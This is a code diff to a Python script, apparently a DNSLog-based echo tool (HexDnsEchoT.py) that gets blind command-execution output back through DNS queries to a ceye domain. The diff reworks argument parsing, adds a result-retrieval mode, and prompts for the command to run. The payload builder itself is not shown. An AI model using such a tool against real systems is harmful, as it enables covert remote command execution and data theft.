@@ -17,9 +17,18 @@ requestTime = 3 # DNSLog platform interval per request
 commandHex = {}
 
 def get_new_config():
-    global dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
+    global domain,dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
     localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
     lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone="UTC") # record last finish time
+    print(lastFinishTime)
+    print("获取本次命令执行的结果:\npython3 HexDnsEchoT.py -d " + domain + " -t " + token + " -f " + filterdns + " -lt \"" + lastFinishTime + "\"" + " -m GR")
+    commandStartPos = 0
+    commandEndPos = 0
+    lastRecordLen = 0
+    finishOnce = False
+
+def get_config():
+    global dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
     print(lastFinishTime)
     commandStartPos = 0
     commandEndPos = 0
@@ -126,27 +135,47 @@ def deal_data(data: list):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
-    parser.add_argument('-d', "--dnsurl", help = "Enter Your DnsUrl")
-    parser.add_argument('-t', "--token", help = "Enter Your DnsUrl Token")
-    parser.add_argument('-c', "--command", help = "Enter Command")
+    parser.add_argument('-d', "--dnsurl", help = "ceye dnslog")
+    parser.add_argument('-t', "--token", help = "ceye token")
+    parser.add_argument('-lt', "--lastfinishtime", help = "the lastfinisgtime")
+    parser.add_argument('-f', "--filter", help = "dns filter")
+    parser.add_argument('-m', "--model", help = "recent result", default = "result")
     args = parser.parse_args()
-    if args.dnsurl == None:
-        print("Please Enter Your DnsUrl! Use -d")
-        sys.exit(0)
-    if args.token == None:
-        print("Please Your DnsUrl Token! Use -t")
-        sys.exit(0)
-    if args.command == None:
-        print("Please Enter Command! Use -c")
-        sys.exit(0)
-    get_new_config()
-    filterdns = generate_code(8)
-    dnsurl = filterdns + "." +args.dnsurl
-    print(dnsurl)
-    token = args.token
-    print(token)
-    command = args.command
-    generate_command()
+    if args.model == "GR":
+        if args.dnsurl == None:
+            print("without ceyedns!")
+            sys.exit(0)
+        if args.token == None:
+            print("without ceyetoken!")
+            sys.exit(0)
+        if args.lastfinishtime == None:
+            print("without lastfinishtime!")
+            sys.exit(0)
+        lastFinishTime = args.lastfinishtime
+        get_config()
+        domain = args.dnsurl
+        filterdns = args.filter
+        dnsurl =args.filter + "." + args.dnsurl
+        print(dnsurl)
+        token = args.token
+        print(token)
+    else:
+        if args.dnsurl == None:
+            print("without ceyedns!")
+            sys.exit(0)
+        if args.token == None:
+            print("without ceyetoken!")
+            sys.exit(0)
+        filterdns = generate_code(8)
+        domain = args.dnsurl
+        dnsurl = filterdns + "." +args.dnsurl
+        print(dnsurl)
+        token = args.token
+        print(token)
+        command = input("请输入想要执行的命令:")
+        get_new_config()
+        generate_command()
+        
 
     while True:
         if finishOnce:   
@@ -156,7 +185,7 @@ if __name__ == "__main__":
             print(dnsurl)
             token = args.token
             print(token)
-            command = args.command
+            command = input("请输入想要执行的命令:")
             generate_command()
 
         for i in range(requestTime,-1,-1):
